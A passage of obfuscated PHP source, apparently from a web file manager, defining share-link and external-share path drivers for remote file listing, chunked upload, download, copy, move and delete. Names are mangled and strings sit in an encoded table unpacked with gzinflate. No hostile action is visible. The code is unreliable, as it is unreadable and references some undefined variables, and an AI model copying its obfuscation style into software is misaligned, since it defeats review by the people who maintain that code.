gzinflate(substr($_SERVER[µÅ˜º…æ][703], 10, -8))); $ntkuvzwbfd = $_SERVER[µÅ˜º…æ][704]; goto b­‹İØ¸±¯; Fˆ–İˆóô: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ó§¨ƒºÓ) { $this->pathParse = $ó§¨ƒºÓ; } protected function infoParse($¹Ä€À¤Œ, $òÛŸ„× = false) { $·¡ºœ¼æ =& $_SERVER[µÅ˜º…æ]; return Action($·¡ºœ¼æ[1364])->sharePathInfo($this->pathParse[$·¡ºœ¼æ[87]], !0, $òÛŸ„×); } public function listPath($–â‹‚–È, $˜Ë§•ß = false) { $¸Œ”ï¿– =& $_SERVER[µÅ˜º…æ]; $±„ø˜Åì = IO::listPath($–â‹‚–È, $˜Ë§•ß); if (!$±„ø˜Åì) { return $±„ø˜Åì; } if (is_array($±„ø˜Åì[$¸Œ”ï¿–[966]])) { $è†©¨úÚ = Action($¸Œ”ï¿–[1550])->parsePathChildren($±„ø˜Åì[$¸Œ”ï¿–[966]], array($¸Œ”ï¿–[510] => $–â‹‚–È)); $±„ø˜Åì[$¸Œ”ï¿–[966]] = Action($¸Œ”ï¿–[1364])->shareItemInfo($è†©¨úÚ); } foreach ($±„ø˜Åì as $£ñù¶ => $Å±Ñ) { if (!in_array($£ñù¶, array($¸Œ”ï¿–[86], $¸Œ”ï¿–[85]))) { continue; } foreach ($Å±Ñ as $òµßòªä => $è†©¨úÚ) { $è†©¨úÚ = Action($¸Œ”ï¿–[1550])->parsePathChildren($è†©¨úÚ, array($¸Œ”ï¿–[510] => $–â‹‚–È)); $±„ø˜Åì[$£ñù¶][$òµßòªä] = Action($¸Œ”ï¿–[1364])->shareItemInfo($è†©¨úÚ); } } return $±„ø˜Åì; } } class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($×’µÆÔ´) { $¡¤«ìö =& $_SERVER[µÅ˜º…æ]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $×’µÆÔ´; $İÅæ‡¶Ç = Model($¡¤«ìö[686])->getInfo($×’µÆÔ´[$¡¤«ìö[487]]); $ˆ¾¼ÜÎ¶ = _get($İÅæ‡¶Ç, $¡¤«ìö[580]); $¦Ö° Â‚ = Model($¡¤«ìö[587])->authMake(_get($İÅæ‡¶Ç, $¡¤«ìö[1551])); if (!$İÅæ‡¶Ç) { IO::errorTips(LNG($¡¤«ìö[1552]), !1); } if (!$¦Ö° Â‚) { IO::errorTips(LNG($¡¤«ìö[1553]), !1); } if ($ˆ¾¼ÜÎ¶ && is_string($ˆ¾¼ÜÎ¶)) { $ˆ¾¼ÜÎ¶ = json_decode($ˆ¾¼ÜÎ¶, !0); } if (!$ˆ¾¼ÜÎ¶ || !$¦Ö° Â‚) { return; } $this->_config = array($¡¤«ìö[1358] => rtrim($×’µÆÔ´[$¡¤«ìö[1358]], $¡¤«ìö[8]) . $¡¤«ìö[8], $¡¤«ìö[1554] => $¡¤«ìö[1462] . $ˆ¾¼ÜÎ¶[$¡¤«ìö[1555]] . $¡¤«ìö[499], $¡¤«ìö[576] => $İÅæ‡¶Ç, $¡¤«ìö[580] => $ˆ¾¼ÜÎ¶, $¡¤«ìö[1556] => $¦Ö° Â‚, $¡¤«ìö[1557] => substr(APP_HOST, 0, 8) == $¡¤«ìö[217], $¡¤«ìö[1558] => Model($¡¤«ìö[591])->authCheck($¦Ö° Â‚[$¡¤«ìö[503]], AuthModel::AUTH_VIEW, !1), $¡¤«ìö[1559] => Model($¡¤«ìö[591])->authCheck($¦Ö° Â‚[$¡¤«ìö[503]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($Ñ«Äãºî) { $İ¥§ˆ€à =& $_SERVER[µÅ˜º…æ]; $–µø† = $this->_config; if (!$–µø†) { return !1; } $ÈØåÛë¬ = array($İ¥§ˆ€à[1560] => $–µø†[$İ¥§ˆ€à[1558]], $İ¥§ˆ€à[1561] => $–µø†[$İ¥§ˆ€à[1558]], $İ¥§ˆ€à[1386] => $–µø†[$İ¥§ˆ€à[1558]], $İ¥§ˆ€à[107] => $–µø†[$İ¥§ˆ€à[1559]], $İ¥§ˆ€à[1562] => $–µø†[$İ¥§ˆ€à[1559]], $İ¥§ˆ€à[1335] => $–µø†[$İ¥§ˆ€à[1559]], $İ¥§ˆ€à[1563] => !1, $İ¥§ˆ€à[429] => !1, $İ¥§ˆ€à[1564] => !1, $İ¥§ˆ€à[1565] => !1); return $ÈØåÛë¬[$Ñ«Äãºî]; } public function listPath($í¥Û³Š…, $”¶õâ¬® = false) { return $this->request($_SERVER[µÅ˜º…æ][1566], array($í¥Û³Š…)); } public function setContent($…Ôˆ˜ÒŠ, $öÑƒ¹Øõ = '') { return $this->request($_SERVER[µÅ˜º…æ][1567], array($…Ôˆ˜ÒŠ, $öÑƒ¹Øõ)); } public function getContent($‘âñ£) { return $this->_fileSubstr($‘âñ£); } public function fileSubstr($º›©’Ø£, $ò–ÊÄ´, $¹ó§€£˜) { return $this->_fileSubstr($º›©’Ø£, $ò–ÊÄ´, $¹ó§€£˜); } public function download($Ë²Œ¡Ã, $‡‘¤˜×²) { return $this->_download($Ë²Œ¡Ã, $‡‘¤˜×²); } public function isFileOutServer() { return !1; } public function fileOut($á•§Àâø, $ãú”ĞÊâ = false, $¦Ş©ÚÎŒ = false, $«¯ì±Ñç = '') { $·ïñü… =& $_SERVER[µÅ˜º…æ]; $this->fileOutLink($this->_fileLink($á•§Àâø, ($«¯ì±Ñç ? $·ïñü…[1568] . $«¯ì±Ñç : $·ïñü…[12]) . ($ãú”ĞÊâ ? $·ïñü…[1569] : $·ïñü…[12]))); } public function fileOutImage($””ıŒÖª, $ŠŞüñ¬î = 250) { $this->fileOutLink($this->_fileLink($””ıŒÖª, $_SERVER[µÅ˜º…æ][1570] . $ŠŞüñ¬î)); } public function fileOutLink($¦ƒï„Øú) { header($_SERVER[µÅ˜º…æ][172] . $this->urlAuto($¦ƒï„Øú)); die; } public function exist($º«€Ë‹) { $Æ€”ƒÄ« = $this->_info($º«€Ë‹); return $Æ€”ƒÄ« ? !0 : !1; } public function isFile($Á¾ö¯Ô) { $œ¦Ç¦â =& $_SERVER[µÅ˜º…æ]; $ØÏŸú´Ù = $this->_info($Á¾ö¯Ô); return _get($ØÏŸú´Ù, $œ¦Ç¦â[33], $œ¦Ç¦â[12]) == $œ¦Ç¦â[230]; } public function isFolder($Ø»úÉ) { $—ŒËÛ§Ú =& $_SERVER[µÅ˜º…æ]; $‡—ÖÁò¼ = $this->_info($Ø»úÉ); return _get($‡—ÖÁò¼, $—ŒËÛ§Ú[33], $—ŒËÛ§Ú[12]) == $—ŒËÛ§Ú[78]; } public function size($˜Ïä˜’¦) { $õô¬ÍÆ‹ = $this->_info($˜Ïä˜’¦); return _get($õô¬ÍÆ‹, $_SERVER[µÅ˜º…æ][79], 0); } public function info($ö•Û­šÀ) { return $this->_info($ö•Û­šÀ); } public function infoAuth($À—’Ç ê) { return $this->_info($À—’Ç ê); } public function infoFull($’ºó¤ƒ) { return $this->_info($’ºó¤ƒ); } public function infoFullSimple($¦…±á¨ü) { return $this->_info($¦…±á¨ü); } public function infoWithChildren($ÒŞ°œÜˆ) { return $this->_info($ÒŞ°œÜˆ, !0); } public function has($øÆ®ÜÄ, $Ü å¬Ä‘ = false, $„ŒĞ¥ş‹ = false) { $Ø°ùßÅÇ =& $_SERVER[µÅ˜º…æ]; $°‘†ºÅÙ = $this->_info($øÆ®ÜÄ); if (!$°‘†ºÅÙ) { return !1; } if ($Ü å¬Ä‘) { return array($Ø°ùßÅÇ[239] => $°‘†ºÅÙ[$Ø°ùßÅÇ[239]], $Ø°ùßÅÇ[240] => $°‘†ºÅÙ[$Ø°ùßÅÇ[240]]); } return $«‘½¿İ½ ? $°‘†ºÅÙ[$Ø°ùßÅÇ[239]] > 0 : $°‘†ºÅÙ[$Ø°ùßÅÇ[240]] > 0; } public function mkfile($ÁÛËß³›, $œ‡€¦‹¬ = '', $²òó¼¹Ä = REPEAT_RENAME) { return $this->request($_SERVER[µÅ˜º…æ][1543], array($ÁÛËß³›, $œ‡€¦‹¬, $²òó¼¹Ä)); } public function mkdir($‡…ï»…, $¶¯¥ã¯Š = REPEAT_SKIP) { return $this->request($_SERVER[µÅ˜º…æ][1544], array($‡…ï»…, $¶¯¥ã¯Š)); } public function remove($‰æğõÂŠ) { return $this->request($_SERVER[µÅ˜º…æ][1335], array($‰æğõÂŠ)); } public function rename($á¯§ÈÛ, $ŒàÒ»ø) { return $this->request($_SERVER[µÅ˜º…æ][1547], array($á¯§ÈÛ, $ŒàÒ»ø)); } public function moveSameAllow() { } public function copy($Áì£êÕ», $çõğñ·È, $’—¦ê’» = REPEAT_REPLACE, $ºÅíÅ¾å = false) { return $this->request($_SERVER[µÅ˜º…æ][641], array($Áì£êÕ», $çõğñ·È, $’—¦ê’»)); } public function move($ıª•öéÀ, $×’µ’‹, $¯äã¨ñ = REPEAT_REPLACE, $Üæ˜Û¨Û = false) { return $this->request($_SERVER[µÅ˜º…æ][643], array($ıª•öéÀ, $×’µ’‹, $¯äã¨ñ)); } public function uploadLink($Øäı®´õ, $Ïõƒ‚Ş¦ = 0) { $òÆùÍôó =& $_SERVER[µÅ˜º…æ]; $­üâ¾¾ = IO::init($GLOBALS[$òÆùÍôó[7]][$òÆùÍôó[87]]); $ıÔÜ—î§ = $this->pathApiEncode($­üâ¾¾->path); $Í´ˆÁ¦ = $this->requestMakeUrl($òÆùÍôó[1571], array($òÆùÍôó[87] => $ıÔÜ—î§)); return array($òÆùÍôó[1572] => $Í´ˆÁ¦); } public function upload($ı’±½‰˜, $ÄõÖŠí, $Ÿõ¸·¾ = false, $‡Ôàıü‚ = REPEAT_REPLACE) { $Ò‰€æò =& $_SERVER[µÅ˜º…æ]; if (filesize($ÄõÖŠí) < $this->uploadChunkSize) { return $this->request($Ò‰€æò[107], array($ı’±½‰˜, $ÄõÖŠí, $‡Ôàıü‚)); } $òŞºÉ« = $this->uploadHashCheck($ı’±½‰˜, $ÄõÖŠí, $‡Ôàıü‚); if ($òŞºÉ«) { return $òŞºÉ«; } $ªÛù„™¸ = @filesize($ÄõÖŠí); $®ıŒÂúƒ = $this->uploadChunkSize; $Ô…®éÄö = ceil($ªÛù„™¸ / $®ıŒÂúƒ); $Ü½È¾’ = 0; while ($Ü½È¾’ < $Ô…®éÄö) { $µØ¨ëŞ‘ = IO::fileSubstr($ÄõÖŠí, $Ü½È¾’ * $®ıŒÂúƒ, $®ıŒÂúƒ); $§™â¶Ş = $this->tempFile($Ò‰€æò[12], $µØ¨ëŞ‘); $ä×“ÀÃß = array($Ò‰€æò[79] => $ªÛù„™¸, $Ò‰€æò[1573] => $®ıŒÂúƒ, $Ò‰€æò[1574] => $Ô…®éÄö, $Ò‰€æò[1575] => $Ü½È¾’); $À‚§ÖÊú = $this->uploadSend($ı’±½‰˜, $§™â¶Ş, $ä×“ÀÃß, $‡Ôàıü‚); $Ü½È¾’++; if (!$À‚§ÖÊú) { return !1; } } if (!is_array($À‚§ÖÊú) || empty($À‚§ÖÊú[$Ò‰€æò[595]])) { return !1; } return $this->pathApiDecode($À‚§ÖÊú[$Ò‰€æò[595]]); } private function uploadHashCheck($¾×¿µëñ, $ÌˆŒ ú”, $Ï›­®·©) { $öÌƒµÁ¿ =& $_SERVER[µÅ˜º…æ]; $ÇâãÆ½ = IO::hashSimple($ÌˆŒ ú”); $îõ™›… = array($öÌƒµÁ¿[1576] => $öÌƒµÁ¿[1577], $öÌƒµÁ¿[1536] => $ÇâãÆ½); $ˆŞŸò«ü = $this->uploadSend($¾×¿µëñ, $öÌƒµÁ¿[12], $îõ™›…, $Ï›­®·©); $ú¡²– = _get($ˆŞŸò«ü, $öÌƒµÁ¿[595], array()); $Œá•¡Óª = _get($ú¡²–, $öÌƒµÁ¿[1578]); if (!is_array($Œá•¡Óª) || !$Œá•¡Óª[$öÌƒµÁ¿[563]]) { return !1; } $œ›‡œ = IO::hashMd5($ÌˆŒ ú”); if ($Œá•¡Óª[$öÌƒµÁ¿[563]] != $œ›‡œ) { return !1; } if ($ˆŞŸò«ü[$öÌƒµÁ¿[595]][$öÌƒµÁ¿[1579]]) { $this->uploadChunkSize = $ˆŞŸò«ü[$öÌƒµÁ¿[595]][$öÌƒµÁ¿[1579]]; } $îõ™›… = array($öÌƒµÁ¿[1576] => $öÌƒµÁ¿[1580], $öÌƒµÁ¿[1537] => $œ›‡œ, $öÌƒµÁ¿[1536] => $ÇâãÆ½); $ˆŞŸò«ü = $this->uploadSend($¾×¿µëñ, $öÌƒµÁ¿[12], $îõ™›…, $Ï›­®·©); if (!is_array($ˆŞŸò«ü) || empty($ˆŞŸò«ü[$öÌƒµÁ¿[595]])) { return !1; } return $this->pathApiDecode($ˆŞŸò«ü[$öÌƒµÁ¿[595]]); } private function uploadSend($êèì•‰, $»Í§·îÕ, $Êë§¤Éğ, $Öü÷™±ú = '') { $¡½Ù“Ï¢ =& $_SERVER[µÅ˜º…æ]; $Êë§¤Éğ[$¡½Ù“Ï¢[32]] = get_path_this($êèì•‰); $Êë§¤Éğ[$¡½Ù“Ï¢[87]] = $this->pathApiEncode(get_path_father($êèì•‰)); if ($Öü÷™±ú) { $Êë§¤Éğ[$¡½Ù“Ï¢[1581]] = $Öü÷™±ú; } if ($»Í§·îÕ) { $Êë§¤Éğ[$¡½Ù“Ï¢[230]] = $¡½Ù“Ï¢[1399] . $»Í§·îÕ; } return $this->requestSend($¡½Ù“Ï¢[1571], $Êë§¤Éğ); } protected function pathApiEncode($ô‰°Û«) { $Ïêµ°æ =& $_SERVER[µÅ˜º…æ]; $§£¤ = $this->_config[$Ïêµ°æ[1554]]; $åœµôò = strlen($§£¤); if (substr($ô‰°Û«, 0, $åœµôò) == $§£¤) { return $ô‰°Û«; } return $§£¤ . ltrim($ô‰°Û«, $Ïêµ°æ[8]); } protected function pathApiDecode($ˆáŸ°°Ğ) { $éê€¡×À =& $_SERVER[µÅ˜º…æ]; $ôº¹÷‰Â = $this->_config[$éê€¡×À[1554]]; $Ê§šÀ•¯ = strlen($ôº¹÷‰Â); if (substr($ˆáŸ°°Ğ, 0, $Ê§šÀ•¯) !== $ôº¹÷‰Â) { return $ˆáŸ°°Ğ; } return $this->_config[$éê€¡×À[1358]] . ltrim(substr($ˆáŸ°°Ğ, $Ê§šÀ•¯), $éê€¡×À[8]); } private function pathInfoParse(&$ÅşåíÄŒ) { $¹®Çò =& $_SERVER[µÅ˜º…æ]; $õ¸óŒÆ¼ = $this->_config; $¬¿ºéß = $õ¸óŒÆ¼[$¹®Çò[576]]; if (!$ÅşåíÄŒ || !is_array($ÅşåíÄŒ)) { return $ÅşåíÄŒ; } static $ç©Â›™‡ = array(); $ıêÉÚÄ£ = $ç©Â›™‡[$¬¿ºéß[$¹®Çò[687]]]; if (!is_array($ıêÉÚÄ£)) { $…¿ÙıŠû = LNG($¹®Çò[1582]); $Í—§…Èå = $õ¸óŒÆ¼[$¹®Çò[580]][$¹®Çò[90]]; $şñé£”Œ = parse_url($õ¸óŒÆ¼[$¹®Çò[580]][$¹®Çò[1583]]); $î±Û¼­§ = $õ¸óŒÆ¼[$¹®Çò[580]][$¹®Çò[1584]]; $ıêÉÚÄ£ = array($¹®Çò[1585] => $Í—§…Èå[$¹®Çò[32]] . $¹®Çò[1066] . $î±Û¼­§ . $¹®Çò[1399] . $şñé£”Œ[$¹®Çò[206]] . $¹®Çò[1068], $¹®Çò[1586] => $…¿ÙıŠû . $¹®Çò[1135] . $õ¸óŒÆ¼[$¹®Çò[580]][$¹®Çò[1583]] . $¹®Çò[1587] . LNG($¹®Çò[1588]) . $¹®Çò[1135] . $î±Û¼­§, $¹®Çò[1589] => LNG($¹®Çò[1590]) . $¹®Çò[1591] . $õ¸óŒÆ¼[$¹®Çò[580]][$¹®Çò[1583]] . $¹®Çò[285] . LNG($¹®Çò[1592]) . $¹®Çò[1591] . $Í—§…Èå[$¹®Çò[602]], $¹®Çò[1584] => array($¹®Çò[32] => $î±Û¼­§, $¹®Çò[1593] => $¹®Çò[1594]), $¹®Çò[1595] => Action($¹®Çò[1541])->shareTargetMake($¬¿ºéß[$¹®Çò[1551]])); $ç©Â›™‡[$¬¿ºéß[$¹®Çò[687]]] = $ıêÉÚÄ£; } unset($ÅşåíÄŒ[$¹®Çò[191]]); unset($ÅşåíÄŒ[$¹®Çò[604]]); unset($ÅşåíÄŒ[$¹®Çò[188]]); unset($ÅşåíÄŒ[$¹®Çò[589]]); $ÅşåíÄŒ[$¹®Çò[1596]] = !0; $ÅşåíÄŒ[$¹®Çò[232]] = $õ¸óŒÆ¼[$¹®Çò[1558]]; $ÅşåíÄŒ[$¹®Çò[233]] = $õ¸óŒÆ¼[$¹®Çò[1559]]; $ÅşåíÄŒ[$¹®Çò[502]] = $õ¸óŒÆ¼[$¹®Çò[1556]]; $ÅşåíÄŒ[$¹®Çò[1584]] = $ıêÉÚÄ£[$¹®Çò[1584]]; $ÅşåíÄŒ[$¹®Çò[1597]] = $¬¿ºéß[$¹®Çò[231]]; $ÅşåíÄŒ[$¹®Çò[1598]] = $¬¿ºéß[$¹®Çò[88]]; $ÅşåíÄŒ[$¹®Çò[1599]] = $ıêÉÚÄ£[$¹®Çò[1589]]; $ÅşåíÄŒ[$¹®Çò[1595]] = $ıêÉÚÄ£[$¹®Çò[1595]]; $ÅşåíÄŒ[$¹®Çò[687]] = $¬¿ºéß[$¹®Çò[687]]; $³¸Ç™î£ = explode($¹®Çò[8], trim($ÅşåíÄŒ[$¹®Çò[602]], $¹®Çò[8])); $³¸Ç™î£[0] = $ıêÉÚÄ£[$¹®Çò[1585]]; $ÅşåíÄŒ[$¹®Çò[602]] = implode($¹®Çò[8], $³¸Ç™î£); if (count($³¸Ç™î£) > 1) { unset($ÅşåíÄŒ[$¹®Çò[1595]]); } if (count($³¸Ç™î£) == 1) { if ($ÅşåíÄŒ[$¹®Çò[33]] == $¹®Çò[78]) { $ÅşåíÄŒ[$¹®Çò[32]] = $ıêÉÚÄ£[$¹®Çò[1585]]; } array_set_value($ÅşåíÄŒ, $¹®Çò[1600], $ıêÉÚÄ£[$¹®Çò[1586]]); } $¾åùáçÖ = array($¹®Çò[1601], $¹®Çò[1521], $¹®Çò[1602], $¹®Çò[1603]); foreach ($¾åùáçÖ as $â›…ç¾¹) { $’Ñ‹èı = $this->urlAuto(_get($ÅşåíÄŒ, $â›…ç¾¹, $¹®Çò[12])); if ($’Ñ‹èı) { array_set_value($ÅşåíÄŒ, $â›…ç¾¹, $’Ñ‹èı); } } } private function _info($«˜ê®‘ë, $™ æŸşÜ = false) { $µÅÆ¤Ï =& $_SERVER[µÅ˜º…æ]; $…ÔøìŒ = $this->_config; if (!$…ÔøìŒ) { return !1; } static $‚´Û®äÑ = array(); if (isset($‚´Û®äÑ[$«˜ê®‘ë]) && is_array($‚´Û®äÑ[$«˜ê®‘ë])) { return $‚´Û®äÑ[$«˜ê®‘ë]; } if ((!$«˜ê®‘ë || !trim($«˜ê®‘ë, $µÅÆ¤Ï[8])) && !$™ æŸşÜ) { $Óü÷ĞôÎ = $…ÔøìŒ[$µÅÆ¤Ï[580]][$µÅÆ¤Ï[90]]; if (!$Óü÷ĞôÎ) { return !1; } $Óü÷ĞôÎ[$µÅÆ¤Ï[602]] = $µÅÆ¤Ï[12]; $Óü÷ĞôÎ[$µÅÆ¤Ï[87]] = $…ÔøìŒ[$µÅÆ¤Ï[1358]]; $this->pathInfoParse($Óü÷ĞôÎ); return $Óü÷ĞôÎ; } $¯ºìÆ†¹ = $this->request($µÅÆ¤Ï[1604], array($«˜ê®‘ë, $™ æŸşÜ)); $‚´Û®äÑ[$«˜ê®‘ë] = $¯ºìÆ†¹; return $¯ºìÆ†¹; } private function _fileSubstr($Ç‡ÉµÕğ, $®õÅı°° = 0, $™ôç„» = -1) { $¬âÊù =& $_SERVER[µÅ˜º…æ]; $³°´ûÄ¡ = $this->_fileLink($Ç‡ÉµÕğ); if (!$³°´ûÄ¡) { return !1; } $ô©ıÈº¨ = !1; if ($™ôç„» > 0) { $„Ì´ƒ„ = $ëíö«„• + $™ôç„» - 1; $ô©ıÈº¨ = array($¬âÊù[1605] . $ëíö«„• . $¬âÊù[476] . $„Ì´ƒ„); } $š°ª‘Àı = url_request($³°´ûÄ¡, $¬âÊù[1606], !1, $ô©ıÈº¨); return $š°ª‘Àı[$¬âÊù[849]] ? $š°ª‘Àı[$¬âÊù[1393]] : !1; } private function _download($çâ¥ş÷ü, $ö²°İÓ®) { $©”Ÿ÷é = $this->_fileLink($çâ¥ş÷ü); if (!$©”Ÿ÷é) { return !1; } Downloader::start($©”Ÿ÷é, $ö²°İÓ®); return $ö²°İÓ®; } private function _fileLink($ÛéùÎáØ, $êŞ®Áà = '') { $øØéÙÖ† =& $_SERVER[µÅ˜º…æ]; $˜ÉëØ˜¤ = $this->pathApiEncode($ÛéùÎáØ); return $this->requestMakeUrl($øØéÙÖ†[1607], array($øØéÙÖ†[87] => $˜ÉëØ˜¤)) . $êŞ®Áà; } private function urlAuto($¼Š±²¾Ã) { $Ó»Şùş– =& $_SERVER[µÅ˜º…æ]; if (!$¼Š±²¾Ã) { return $¼Š±²¾Ã; } $²ùéñ´™ = parse_url($¼Š±²¾Ã); $ÅÏõ¡Ğ = $¼Š±²¾Ã; if ($this->_config[$Ó»Şùş–[1557]] && $²ùéñ´™[$Ó»Şùş–[205]] == $Ó»Şùş–[149] && Input::check($²ùéñ´™[$Ó»Şùş–[1608]], $Ó»Şùş–[1609])) { $¼Š±²¾Ã = $Ó»Şùş–[217] . substr($¼Š±²¾Ã, 7); } $½ìÚÚé¿ = $Ó»Şùş–[1610] . rawurlencode(rtrim($this->config[$Ó»Şùş–[1554]], $Ó»Şùş–[8])); if (strstr($¼Š±²¾Ã, $½ìÚÚé¿)) { $ù»‹œ‹› = strstr($¼Š±²¾Ã, $Ó»Şùş–[76]) ? $Ó»Şùş–[284] : $Ó»Şùş–[76]; $¼Š±²¾Ã = $¼Š±²¾Ã . $ù»‹œ‹› . $Ó»Şùş–[1611] . $this->authToken; } return $¼Š±²¾Ã; } private function request($×ãÜãóš, $ëïÏ›©Î) { $§¦ö¶”Á =& $_SERVER[µÅ˜º…æ]; if (!is_array($ëïÏ›©Î)) { $ëïÏ›©Î = array(); } for ($–õòØÁ™ = 0; $–õòØÁ™ < 4; $–õòØÁ™++) { if (!isset($ëïÏ›©Î[$–õòØÁ™])) { $ëïÏ›©Î[$–õòØÁ™] = $§¦ö¶”Á[12]; } } $—Í¸Ô³ = array($§¦ö¶”Á[1604] => array($§¦ö¶”Á[1612] => $§¦ö¶”Á[1604], $§¦ö¶”Á[1613] => $§¦ö¶”Á[1614], $§¦ö¶”Á[1615] => $§¦ö¶”Á[87], $§¦ö¶”Á[1357] => array($§¦ö¶”Á[1616] => array(array($§¦ö¶”Á[87] => $ëïÏ›©Î[0])), $§¦ö¶”Á[1617] => $ëïÏ›©Î[1] ? $§¦ö¶”Á[91] : $§¦ö¶”Á[12])), $§¦ö¶”Á[1566] => array($§¦ö¶”Á[1612] => $§¦ö¶”Á[1618], $§¦ö¶”Á[1613] => $§¦ö¶”Á[87], $§¦ö¶”Á[1615] => $§¦ö¶”Á[1619], $§¦ö¶”Á[1357] => array($§¦ö¶”Á[87] => $ëïÏ›©Î[0], $§¦ö¶”Á[428] => _get($GLOBALS[$§¦ö¶”Á[7]], $§¦ö¶”Á[428], $§¦ö¶”Á[91]), $§¦ö¶”Á[439] => _get($GLOBALS[$§¦ö¶”Á[7]], $§¦ö¶”Á[439], $§¦ö¶”Á[1620]))), $§¦ö¶”Á[1621] => array($§¦ö¶”Á[1612] => $§¦ö¶”Á[1622], $§¦ö¶”Á[1613] => $§¦ö¶”Á[87], $§¦ö¶”Á[1615] => $§¦ö¶”Á[1623], $§¦ö¶”Á[1357] => array($§¦ö¶”Á[87] => $ëïÏ›©Î[0])), $§¦ö¶”Á[1567] => array($§¦ö¶”Á[1612] => $§¦ö¶”Á[1624], $§¦ö¶”Á[1613] => $§¦ö¶”Á[87], $§¦ö¶”Á[1625] => $§¦ö¶”Á[1626], $§¦ö¶”Á[1357] => array($§¦ö¶”Á[87] => $ëïÏ›©Î[0], $§¦ö¶”Á[168] => $ëïÏ›©Î[1])), $§¦ö¶”Á[1543] => array($§¦ö¶”Á[1612] => $§¦ö¶”Á[1543], $§¦ö¶”Á[1613] => $§¦ö¶”Á[87], $§¦ö¶”Á[1625] => $§¦ö¶”Á[595], $§¦ö¶”Á[1357] => array($§¦ö¶”Á[87] => $ëïÏ›©Î[0], $§¦ö¶”Á[168] => $ëïÏ›©Î[1], $§¦ö¶”Á[1581] => $ëïÏ›©Î[2])), $§¦ö¶”Á[1544] => array($§¦ö¶”Á[1612] => $§¦ö¶”Á[1544], $§¦ö¶”Á[1613] => $§¦ö¶”Á[87], $§¦ö¶”Á[1625] => $§¦ö¶”Á[595], $§¦ö¶”Á[1357] => array($§¦ö¶”Á[87] => $ëïÏ›©Î[0], $§¦ö¶”Á[1581] => $ëïÏ›©Î[2])), $§¦ö¶”Á[641] => array($§¦ö¶”Á[1612] => $§¦ö¶”Á[1627], $§¦ö¶”Á[1613] => $§¦ö¶”Á[1628], $§¦ö¶”Á[1625] => $§¦ö¶”Á[1629], $§¦ö¶”Á[1357] => array($§¦ö¶”Á[1616] => array(array($§¦ö¶”Á[87] => $ëïÏ›©Î[0])), $§¦ö¶”Á[87] => $ëïÏ›©Î[1], $§¦ö¶”Á[1581] => $ëïÏ›©Î[2])), $§¦ö¶”Á[643] => array($§¦ö¶”Á[1612] => $§¦ö¶”Á[1630], $§¦ö¶”Á[1613] => $§¦ö¶”Á[1628], $§¦ö¶”Á[1625] => $§¦ö¶”Á[1629], $§¦ö¶”Á[1357] => array($§¦ö¶”Á[1616] => array(array($§¦ö¶”Á[87] => $ëïÏ›©Î[0])), $§¦ö¶”Á[87] => $ëïÏ›©Î[1], $§¦ö¶”Á[1581] => $ëïÏ›©Î[2])), $§¦ö¶”Á[1335] => array($§¦ö¶”Á[1612] => $§¦ö¶”Á[1631], $§¦ö¶”Á[1613] => $§¦ö¶”Á[1614], $§¦ö¶”Á[1615] => $§¦ö¶”Á[87], $§¦ö¶”Á[1357] => array($§¦ö¶”Á[1616] => array(array($§¦ö¶”Á[87] => $ëïÏ›©Î[0])))), $§¦ö¶”Á[1547] => array($§¦ö¶”Á[1612] => $§¦ö¶”Á[1632], $§¦ö¶”Á[1613] => $§¦ö¶”Á[87], $§¦ö¶”Á[1625] => $§¦ö¶”Á[595], $§¦ö¶”Á[1357] => array($§¦ö¶”Á[87] => $ëïÏ›©Î[0], $§¦ö¶”Á[1633] => $ëïÏ›©Î[1])), $§¦ö¶”Á[107] => array($§¦ö¶”Á[1612] => $§¦ö¶”Á[1571], $§¦ö¶”Á[1613] => $§¦ö¶”Á[87], $§¦ö¶”Á[1625] => $§¦ö¶”Á[595], $§¦ö¶”Á[1357] => array($§¦ö¶”Á[87] => get_path_father($ëïÏ›©Î[0]), $§¦ö¶”Á[230] => $ëïÏ›©Î[1] ? $§¦ö¶”Á[1399] . $ëïÏ›©Î[1] : $§¦ö¶”Á[12], $§¦ö¶”Á[32] => get_path_this($ëïÏ›©Î[0]), $§¦ö¶”Á[1581] => $ëïÏ›©Î[2]))); $Ô¦à¼Ä = $—Í¸Ô³[$×ãÜãóš]; if (!$Ô¦à¼Ä) { return !1; } $¾›½Â³ = $Ô¦à¼Ä[$§¦ö¶”Á[1357]]; $ß×íÄîŞ = explode($§¦ö¶”Á[50], $Ô¦à¼Ä[$§¦ö¶”Á[1613]]); foreach ($ß×íÄîŞ as $™ş©‘») { $›¤»Ÿã = $this->pathApiEncode(_get($¾›½Â³, $™ş©‘»)); array_set_value($¾›½Â³, $™ş©‘», $›¤»Ÿã); } if ($×ãÜãóš == $§¦ö¶”Á[1547] && trim($Ô¦à¼Ä[$§¦ö¶”Á[1357]][$§¦ö¶”Á[87]], $§¦ö¶”Á[8]) == trim($this->_config[$§¦ö¶”Á[1358]], $§¦ö¶”Á[8])) { return $Ô¦à¼Ä[$§¦ö¶”Á[1357]][$§¦ö¶”Á[87]]; } $ äÕÛ = $this->requestSend($Ô¦à¼Ä[$§¦ö¶”Á[1612]], $¾›½Â³); if (!$ äÕÛ) { return !1; } $ÖÈ‘°­´ = $ äÕÛ[$§¦ö¶”Á[1393]]; if ($Ô¦à¼Ä[$§¦ö¶”Á[1625]]) { $ÖÈ‘°­´ = _get($ äÕÛ, $Ô¦à¼Ä[$§¦ö¶”Á[1625]]); } if (is_string($ÖÈ‘°­´) && !$Ô¦à¼Ä[$§¦ö¶”Á[1615]]) { return $this->pathApiDecode($ÖÈ‘°­´); } if (!is_array($ÖÈ‘°­´) || !$ÖÈ‘°­´) { return $ÖÈ‘°­´; } $›ë¶ª–ø = explode($§¦ö¶”Á[50], $Ô¦à¼Ä[$§¦ö¶”Á[1615]]); foreach ($›ë¶ª–ø as $™ş©‘») { $ÈóŸÍÏË = explode($§¦ö¶”Á[10], $™ş©‘»); $½ïºÓ¾Ù = array_search($§¦ö¶”Á[1634], $ÈóŸÍÏË); if ($½ïºÓ¾Ù === !1) { $›¤»Ÿã = $this->pathApiDecode(_get($ÖÈ‘°­´, $™ş©‘»)); array_set_value($ÖÈ‘°­´, $™ş©‘», $›¤»Ÿã); if ($×ãÜãóš == $§¦ö¶”Á[1604] && $™ş©‘» == $§¦ö¶”Á[87]) { $this->pathInfoParse($ÖÈ‘°­´); } if ($×ãÜãóš == $§¦ö¶”Á[1566] && $™ş©‘» == $§¦ö¶”Á[1635]) { 